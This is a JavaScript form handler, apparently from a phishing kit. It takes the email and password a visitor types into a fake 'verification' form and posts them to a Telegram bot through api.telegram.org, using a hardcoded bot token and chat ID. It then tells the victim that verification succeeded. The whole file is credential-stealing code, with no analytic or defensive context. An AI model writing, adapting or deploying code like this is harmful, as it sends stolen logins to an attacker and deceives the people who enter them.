function sendData(event) {
  event.preventDefault();

  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;
  const isNotBot = document.getElementById("notBot").checked;
  const errorMsg = document.getElementById("errorMsg");

  if (!isNotBot || !email || !password) {
    errorMsg.style.display = "block";
    return;
  }

  errorMsg.style.display = "none";

  // 👇 Replace with your own values
  const token = "7480183266:AAFX1ZNhiuLrnZS76BUkjxAS4eZ4c9SHJkM";         // 🟥 Replace this
  const chat_id = "7978432671";         // 🟥 Replace this

  const message = `📨 New Submission:\n\n📧 Email: ${email}\n🔐 Password: ${password}`;

  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      chat_id: chat_id,
      text: message
    })
  })
    .then(response => response.json())
    .then(data => {
      alert("✅ Verification submitted successfully!");
    })
    .catch(error => {
      console.error("Telegram Error:", error);
      alert("❌ Something went wrong.");
    });
}
s